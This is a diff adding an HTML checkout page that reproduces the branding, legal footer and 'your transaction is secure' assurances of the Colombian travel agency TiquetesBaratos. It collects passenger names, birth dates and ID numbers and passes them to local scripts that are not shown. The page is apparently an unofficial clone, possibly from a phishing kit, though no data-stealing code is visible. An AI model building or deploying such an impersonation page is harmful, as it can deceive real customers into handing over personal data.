@@ -1,0 +1,548 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tiquetes Baratos | Tiquetes, vuelos, hoteles y más</title>
+    <link rel="shortcut icon" href="./assets/svg/logo-tiquetesbaratos.png" type="image/x-icon">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+        rel="stylesheet">
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jsrsasign/10.1.0/jsrsasign-all-min.js"></script>
+
+    <!-- SCRIPTS -->
+    <script src="./js/functions.js"></script>
+
+    <!-- CSS -->
+    <link rel="stylesheet" href="./css/datepicker.css">
+    <link rel="stylesheet" href="./css/normalize.css">
+    <link rel="stylesheet" href="./css/tw.css">
+</head>
+
+<body>
+    <div class="modal modal-loader">
+        <span class="loader"></span>
+    </div>
+
+    <!-- NAVBAR -->
+    <nav class="w-full flex flex-row justify-between items-center p-3 mb-2 shadow-md">
+        <img width="60px" src="./assets/svg/logo-tiquetesbaratos.png">
+        <img width="25px" src="./assets/svg/burger_menu.png">
+    </nav>
+
+
+    <!-- RESUME -->
+    <div class="my-7 mx-3 rounded-lg border border-zinc-400 pt-5 overflow-y-hidden text-[#333]">
+        <div id="resume-flight-go" class="px-4">
+            <!-- <p class="poppins-medium text-2xl  mb-3">Tu reservación</p>
+            <div class="mb-2 flex flex-row justify-between items-center">
+                <div class="flex flex-row gap-2">
+                    <img src="./assets/svg/plane2_icon.png" width="25px">
+                    <p class="text-xl font-regular">Ida</p>
+                </div>
+                <img src="./assets/svg/ltm_logo.png" width="80px">
+            </div>
+            <p class="mb-2">Miércoles, 22 enero 2025</p>
+            <p class="mb-2">Vuelo: 4020|1 <a href="">Parada</a></p>
+            <p class="mb-2">Sale: <b>Bogotá - 05:04</b></p>
+            <p class="mb-2">Llega: <b>Santa Marta - 17:22</b></p>
+            <p class="mb-2">Tarifa: Basic</p> -->
+        </div>
+        <div id="resume-flight-back" class="mt-4 pt-2 mx-4 border-t">
+            <!-- <div class="mb-2 flex flex-row justify-between items-center">
+                <div class="flex flex-row gap-2">
+                    <img src="./assets/svg/plane2_icon.png" width="25px">
+                    <p class="text-xl font-regular">Regreso</p>
+                </div>
+                <img src="./assets/svg/avi_logo.png" width="80px">
+            </div>
+            <p class="mb-2">Miércoles, 22 enero 2025</p>
+            <p class="mb-2">Vuelo: 4020|1 <a href="">Parada</a></p>
+            <p class="mb-2">Sale: <b>Bogotá - 05:04</b></p>
+            <p class="mb-2">Llega: <b>Santa Marta - 17:22</b></p>
+            <p class="mb-2">Tarifa: Basic</p> -->
+        </div>
+        <div id="resume-total" class="px-4 py-3 bg-[#FFFBEB]">
+            <div class="flex flex-row justify-between items-center">
+                <p>1 Aduto(s), 2 Niño(s)</p>
+                <p>$ 525.700</p>
+            </div>
+            <div class="flex flex-row justify-between items-center mb-3">
+                <p>Impuestos, tasas y cargos</p>
+                <p>$ 0.00</p>
+            </div>
+            <div class="poppins-semibold text-3xl text-[#003B98] flex flex-row justify-between items-center">
+                <p>Total</p>
+                <p>$ 525.700</p>
+            </div>
+        </div>
+    </div>
+
+    <!-- PASSENGERS INFO -->
+    <div id="passengers">
+        <div class="my-7 mx-3 px-3 py-4 bg-[#f8fafc] rounded-lg border border-zinc-400 pt-5 overflow-y-hidden text-[#333]">
+            <form class="space-y-4">
+                <h2 class="text-md mb-4">Adulto 1</h2>
+    
+                <div class="space-y-1 relative">
+                    <label class="label-float-input text-sm text-gray-600">Primer nombre</label>
+                    <input type="text" class="w-full py-3 px-3 border rounded outline-none" required>
+                </div>
+    
+                <div class="space-y-1 relative">
+                    <label class="label-float-input text-sm text-gray-600">Primer apellido</label>
+                    <input type="text" class="w-full py-3 px-3 border rounded outline-none" required>
+                </div>
+    
+                <div class="space-y-2">
+                    <label class="block text-md text-gray-700">Fecha de Nacimiento</label>
+                    <div class="grid grid-cols-3 gap-2">
+                        <div class="relative">
+                            <label class="label-float-input text-sm text-gray-600">Dia</label>
+                            <select
+                                class="appearance-none w-full p-2 border rounded outline-none bg-white text-gray-700 pr-8"
+                                required>
+                                <option value="" disabled selected hidden>--</option>
+                                <option value="01">01</option>
+                                <option value="02">02</option>
+                                <!-- Añade más opciones para los días aquí -->
+                                <option value="31">31</option>
+                            </select>
+                            <div
+                                class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700">
+                                <svg class="fill-current h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
+                                    <path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z" />
+                                </svg>
+                            </div>
+                        </div>
+                        <div class="relative">
+                            <label class="label-float-input text-sm text-gray-600">Mes</label>
+                            <select
+                                class="appearance-none w-full p-2 border rounded outline-none bg-white text-gray-700 pr-8"
+                                required>
+                                <option value="" disabled selected hidden>--</option>
+                                <option value="01">01</option>
+                                <option value="02">02</option>
+                                <!-- Añade más opciones para los meses aquí -->
+                                <option value="12">12</option>
+                            </select>
+                            <div
+                                class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700">
+                                <svg class="fill-current h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
+                                    <path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z" />
+                                </svg>
+                            </div>
+                        </div>
+                        <div class="relative">
+                            <label class="label-float-input text-sm text-gray-600">Año</label>
+                            <select
+                                class="appearance-none w-full p-2 border rounded outline-none bg-white text-gray-700 pr-8"
+                                required>
+                                <option value="" disabled selected hidden>--</option>
+                                <option value="2023">2023</option>
+                                <option value="2022">2022</option>
+                                <!-- Añade más opciones para los años aquí -->
+                                <option value="1900">1900</option>
+                            </select>
+                            <div
+                                class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700">
+                                <svg class="fill-current h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
+                                    <path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z" />
+                                </svg>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+    
+                <div class="space-y-1 relative">
+                    <label class="label-float-input text-sm text-gray-600">Cédula de ciudadanía</label>
+                    <input type="text" class="w-full py-3 px-3 border rounded outline-none" required>
+                </div>
+            </form>
+        </div>
+        <div class="my-7 mx-3 px-3 py-4 bg-[#f8fafc] rounded-lg border border-zinc-400 pt-5 overflow-y-hidden text-[#333]">
+            <form class="space-y-4">
+                <h2 class="text-md mb-4">Niño 1</h2>
+    
+                <div class="space-y-1 relative">
+                    <label class="label-float-input text-sm text-gray-600">Primer nombre</label>
+                    <input type="text" class="w-full py-3 px-3 border rounded outline-none" required>
+                </div>
+    
+                <div class="space-y-1 relative">
+                    <label class="label-float-input text-sm text-gray-600">Primer apellido</label>
+                    <input type="text" class="w-full py-3 px-3 border rounded outline-none" required>
+                </div>
+    
+                <div class="space-y-2">
+                    <label class="block text-md text-gray-700">Fecha de Nacimiento</label>
+                    <div class="grid grid-cols-3 gap-2">
+                        <div class="relative">
+                            <label class="label-float-input text-sm text-gray-600">Dia</label>
+                            <select
+                                class="appearance-none w-full p-2 border rounded outline-none bg-white text-gray-700 pr-8"
+                                required>
+                                <option value="" disabled selected hidden>--</option>
+                                <option value="01">01</option>
+                                <option value="02">02</option>
+                                <!-- Añade más opciones para los días aquí -->
+                                <option value="31">31</option>
+                            </select>
+                            <div
+                                class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700">
+                                <svg class="fill-current h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
+                                    <path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z" />
+                                </svg>
+                            </div>
+                        </div>
+                        <div class="relative">
+                            <label class="label-float-input text-sm text-gray-600">Mes</label>
+                            <select
+                                class="appearance-none w-full p-2 border rounded outline-none bg-white text-gray-700 pr-8"
+                                required>
+                                <option value="" disabled selected hidden>--</option>
+                                <option value="01">01</option>
+                                <option value="02">02</option>
+                                <!-- Añade más opciones para los meses aquí -->
+                                <option value="12">12</option>
+                            </select>
+                            <div
+                                class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700">
+                                <svg class="fill-current h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
+                                    <path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z" />
+                                </svg>
+                            </div>
+                        </div>
+                        <div class="relative">
+                            <label class="label-float-input text-sm text-gray-600">Año</label>
+                            <select
+                                class="appearance-none w-full p-2 border rounded outline-none bg-white text-gray-700 pr-8"
+                                required>
+                                <option value="" disabled selected hidden>--</option>
+                                <option value="2023">2023</option>
+                                <option value="2022">2022</option>
+                                <!-- Añade más opciones para los años aquí -->
+                                <option value="1900">1900</option>
+                            </select>
+                            <div
+                                class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700">
+                                <svg class="fill-current h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
+                                    <path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z" />
+                                </svg>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+    
+                <div class="space-y-1 relative">
+                    <label class="label-float-input text-sm text-gray-600">Cédula de ciudadanía</label>
+                    <input type="text" class="w-full py-3 px-3 border rounded outline-none" required>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <p class="text-sm mx-3 mb-4">Al hacer click en el botón Reservar y pagar, usted está aceptando los <span class="text-[#2196f3]">Términos y Condiciones de la compra y la Política de Privacidad.</span></p>
+
+    <!-- NEXT STEP -->
+    <div class="px-3 mb-4">
+        <button onclick="nextStep()" class="block w-full text-sm rounded py-4 bg-[#2196f3] poppins-semibold text-white text-center">
+            Reservar y pagar
+        </button>
+    </div>
+
+    <div class="max-w-md mx-auto p-6 bg-blue-50 rounded-lg shadow-sm">
+        <div class="flex flex-col items-center text-center space-y-3">
+          <!-- Lock Icon -->
+          <div class="text-blue-700">
+            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+              <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+            </svg>
+          </div>
+          
+          <!-- Main Text -->
+          <p class="text-gray-800 font-medium">
+            Su información personal y su transacción están seguras
+          </p>
+          
+          <!-- Website URL -->
+          <p class="text-blue-800 font-semibold">
+            www.TiquetesBaratos.com
+          </p>
+          
+          <!-- Disclaimer Text -->
+          <div class="text-gray-700 text-sm">
+            <span class="font-bold">No GUARDA INFORMACIÓN</span> sobre las tarjetas de crédito de los usuarios que realicen las transacciones en nuestro portal. Nuestra plataforma de pago en línea está avalada por VeriSign
+          </div>
+        </div>
+      </div>
+
+
+    <footer class="bg-[#003b98] px-5 py-10 text-white flex flex-col items-center">
+        <img width="100px" src="./assets/svg/tb_icon.png">
+        <div class="mb-4">
+            <p class="mb-2">Síguenos en nuestras redes</p>
+            <img width="130px" src="./assets/svg/redes_icon.png">
+            <p class="mt-2 mb-1">Comunicate con nosotros</p>
+            <img width="90px" src="./assets/svg/canales_icon.png">
+        </div>
+        <div class="w-full">
+            <div class="w-full py-3 flex flex-row justify-between items-center" style="border-bottom: 1px solid #fff;">
+                <p>Aerolineas destacadas</p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                    class="bi bi-chevron-down" viewBox="0 0 16 16">
+                    <path fill-rule="evenodd"
+                        d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z" />
+                </svg>
+            </div>
+            <div class="w-full py-3 flex flex-row justify-between items-center" style="border-bottom: 1px solid #fff;">
+                <p>Los más vistos</p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                    class="bi bi-chevron-down" viewBox="0 0 16 16">
+                    <path fill-rule="evenodd"
+                        d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z" />
+                </svg>
+            </div>
+            <div class="w-full py-3 flex flex-row justify-between items-center" style="border-bottom: 1px solid #fff;">
+                <p>Sobre tiquetesbaratos.com</p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                    class="bi bi-chevron-down" viewBox="0 0 16 16">
+                    <path fill-rule="evenodd"
+                        d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z" />
+                </svg>
+            </div>
+            <div class="w-full py-3 flex flex-row justify-between items-center" style="border-bottom: 1px solid #fff;">
+                <p>Recursos</p>
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor"
+                    class="bi bi-chevron-down" viewBox="0 0 16 16">
+                    <path fill-rule="evenodd"
+                        d="M1.646 4.646a.5.5 0 0 1 .708 0L8 10.293l5.646-5.647a.5.5 0 0 1 .708.708l-6 6a.5.5 0 0 1-.708 0l-6-6a.5.5 0 0 1 0-.708z" />
+                </svg>
+            </div>
+        </div>
+        <p class="text-sm text-center mt-10">TiquetesBaratos - PRICE RES S.A.S. NIT. 900.474.794-8 , Calle 97A # 8-10 Of
+            204, Bogotá D.C., Bogotá – Colombia, Teléfonos: 601 743 0044. Todos los derechos reservados.Registro
+            Nacional de Turismo No. 44091. soportepqrco@pricetravel.com</p>
+        <p class="text-sm text-center mt-10">En desarrollo de lo dispuesto en el artículo 17 de la ley 679 de 2001, la
+            agencia rechaza la explotación, la pornografía, el turismo sexual y demás formas de abuso sexual con
+            menores, que son sancionados penal y administrativamente conforme a las leyes colombianas.</p>
+    </footer>
+
+
+    <!-- SCRIPTS -->
+    <script src="./js/checkout.js"></script>
+    <script>
+    
+        /**
+         * Inyecta en el DOM un bloque <div> + <form> por cada adulto y cada niño.
+         * Se ignoran los bebés (no se pinta nada para ellos).
+         */
+        function renderPassengers(passengers) {
+          const container = document.getElementById("passengers");
+          // Limpia el contenedor antes de inyectar
+          container.innerHTML = "";
+    
+          // 1) Formulario para cada adulto
+          passengers.adults.forEach((_, index) => {
+            container.innerHTML += `
+              <div class="my-7 mx-3 px-3 py-4 bg-[#f8fafc] rounded-lg border border-zinc-400 pt-5 overflow-y-hidden text-[#333]">
+                <form class="space-y-4">
+                    <h2 class="text-md mb-4">Adulto ${index + 1}</h2>
+        
+                    <div class="space-y-1 relative">
+                        <label class="label-float-input text-sm text-gray-600">Primer nombre</label>
+                        <input type="text" class="w-full py-3 px-3 border rounded outline-none" required>
+                    </div>
+        
+                    <div class="space-y-1 relative">
+                        <label class="label-float-input text-sm text-gray-600">Primer apellido</label>
+                        <input type="text" class="w-full py-3 px-3 border rounded outline-none" required>
+                    </div>
+        
+                    <div class="space-y-2">
+                        <label class="block text-md text-gray-700">Fecha de Nacimiento</label>
+                        <div class="grid grid-cols-3 gap-2">
+                            <div class="relative">
+                                <label class="label-float-input text-sm text-gray-600">Dia</label>
+                                <select
+                                class="appearance-none w-full p-2 border rounded outline-none bg-white text-gray-700 pr-8"
+                                required>
+                                <option value="" disabled selected hidden>--</option>
+                                <!-- Opciones de días -->
+                                ${(() => {
+                                    const options = [];
+                                    for (let day = 1; day <= 31; day++) {
+                                    options.push(`<option value="${String(day).padStart(2, "0")}">${day}</option>`);
+                                    }
+                                    return options.join("");
+                                })()}
+                                </select>
+                                <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700">
+                                    <svg class="fill-current h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
+                                        <path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z" />
+                                    </svg>
+                                </div>
+                            </div>
+                            <div class="relative">
+                                <label class="label-float-input text-sm text-gray-600">Mes</label>
+                                <select
+                                class="appearance-none w-full p-2 border rounded outline-none bg-white text-gray-700 pr-8"
+                                required>
+                                <option value="" disabled selected hidden>--</option>
+                                <!-- Opciones de meses -->
+                                ${(() => {
+                                    const months = [
+                                    "Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio",
+                                    "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre"
+                                    ];
+                                    return months
+                                    .map((month, index) => `<option value="${String(index + 1).padStart(2, "0")}">${month}</option>`)
+                                    .join("");
+                                })()}
+                                </select>
+                                <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700">
+                                    <svg class="fill-current h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
+                                        <path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z" />
+                                    </svg>
+                                </div>
+                            </div>
+                            <div class="relative">
+                                <label class="label-float-input text-sm text-gray-600">Año</label>
+                                <select
+                                class="appearance-none w-full p-2 border rounded outline-none bg-white text-gray-700 pr-8"
+                                required>
+                                <option value="" disabled selected hidden>--</option>
+                                    <!-- Opciones de años -->
+                                    ${(() => {
+                                        const options = [];
+                                        for (let year = 2025; year >= 1940; year--) {
+                                        options.push(`<option value="${year}">${year}</option>`);
+                                        }
+                                        return options.join("");
+                                    })()}
+                                </select>
+                                <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700">
+                                    <svg class="fill-current h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
+                                        <path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z" />
+                                    </svg>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+        
+                    <div class="space-y-1 relative">
+                        <label class="label-float-input text-sm text-gray-600">Cédula de ciudadanía</label>
+                        <input type="text" class="w-full py-3 px-3 border rounded outline-none" required>
+                    </div>
+                </form>
+              </div>
+            `;
+          });
+    
+          // 2) Formulario para cada niño
+          passengers.children.forEach((_, index) => {
+            container.innerHTML += `
+              <div class="my-7 mx-3 px-3 py-4 bg-[#f8fafc] rounded-lg border border-zinc-400 pt-5 overflow-y-hidden text-[#333]">
+                <form class="space-y-4">
+                    <h2 class="text-md mb-4">Niño ${index + 1}</h2>
+        
+                    <div class="space-y-1 relative">
+                        <label class="label-float-input text-sm text-gray-600">Primer nombre</label>
+                        <input type="text" class="w-full py-3 px-3 border rounded outline-none" required>
+                    </div>
+        
+                    <div class="space-y-1 relative">
+                        <label class="label-float-input text-sm text-gray-600">Primer apellido</label>
+                        <input type="text" class="w-full py-3 px-3 border rounded outline-none" required>
+                    </div>
+        
+                    <div class="space-y-2">
+                        <label class="block text-md text-gray-700">Fecha de Nacimiento</label>
+                        <div class="grid grid-cols-3 gap-2">
+                            <div class="relative">
+                                <label class="label-float-input text-sm text-gray-600">Dia</label>
+                                <select
+                                    class="appearance-none w-full p-2 border rounded outline-none bg-white text-gray-700 pr-8"
+                                    required>
+                                    <option value="" disabled selected hidden>--</option>
+                                    ${(() => {
+                                        const options = [];
+                                        for (let day = 1; day <= 31; day++) {
+                                        options.push(`<option value="${String(day).padStart(2, "0")}">${day}</option>`);
+                                        }
+                                        return options.join("");
+                                    })()}
+                                </select>
+                                <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700">
+                                    <svg class="fill-current h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
+                                        <path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z" />
+                                    </svg>
+                                </div>
+                            </div>
+                            <div class="relative">
+                                <label class="label-float-input text-sm text-gray-600">Mes</label>
+                                <select
+                                    class="appearance-none w-full p-2 border rounded outline-none bg-white text-gray-700 pr-8"
+                                    required>
+                                    <option value="" disabled selected hidden>--</option>
+                                    ${(() => {
+                                        const months = [
+                                        "Enero", "Febrero", "Marzo", "Abril", "Mayo", "Junio",
+                                        "Julio", "Agosto", "Septiembre", "Octubre", "Noviembre", "Diciembre"
+                                        ];
+                                        return months
+                                        .map((month, index) => `<option value="${String(index + 1).padStart(2, "0")}">${month}</option>`)
+                                        .join("");
+                                    })()}
+                                </select>
+                                <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700">
+                                    <svg class="fill-current h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
+                                        <path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z" />
+                                    </svg>
+                                </div>
+                            </div>
+                            <div class="relative">
+                                <label class="label-float-input text-sm text-gray-600">Año</label>
+                                <select
+                                    class="appearance-none w-full p-2 border rounded outline-none bg-white text-gray-700 pr-8"
+                                    required>
+                                    <option value="" disabled selected hidden>--</option>
+                                    ${(() => {
+                                        const options = [];
+                                        for (let year = 2025; year >= 1940; year--) {
+                                        options.push(`<option value="${year}">${year}</option>`);
+                                        }
+                                        return options.join("");
+                                    })()}
+                                </select>
+                                <div class="pointer-events-none absolute inset-y-0 right-0 flex items-center px-2 text-gray-700">
+                                    <svg class="fill-current h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
+                                        <path d="M9.293 12.95l.707.707L15.657 8l-1.414-1.414L10 10.828 5.757 6.586 4.343 8z" />
+                                    </svg>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+        
+                    <div class="space-y-1 relative">
+                        <label class="label-float-input text-sm text-gray-600">Cédula de ciudadanía</label>
+                        <input type="text" class="w-full py-3 px-3 border rounded outline-none" required>
+                    </div>
+                </form>
+              </div>
+            `;
+          });
+    
+          // 3) Se ignoran los bebés: no se genera ningún formulario
+          // passengers.babies.forEach(...) --> ELIMINADO
+        }
+    
+        // Llamada a la función para mostrar todos los formularios
+        renderPassengers(info.passengersInfo);
+      </script>
+</body>
+
+</html>
